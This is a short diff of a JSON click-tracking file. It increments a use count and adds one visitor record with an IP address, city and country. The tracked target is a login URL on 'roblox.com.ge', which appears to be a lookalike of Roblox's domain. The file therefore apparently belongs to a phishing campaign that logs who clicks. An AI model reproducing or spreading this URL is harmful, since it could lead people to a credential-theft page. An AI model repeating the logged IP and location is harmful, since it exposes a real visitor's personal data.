@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 831,
+    "useCount": 832,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6760,6 +6760,14 @@
         "city": "Ho Chi Minh City",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777174635836,
+        "ip": "181.236.134.137",
+        "country": "Colombia",
+        "city": "Barranquilla",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
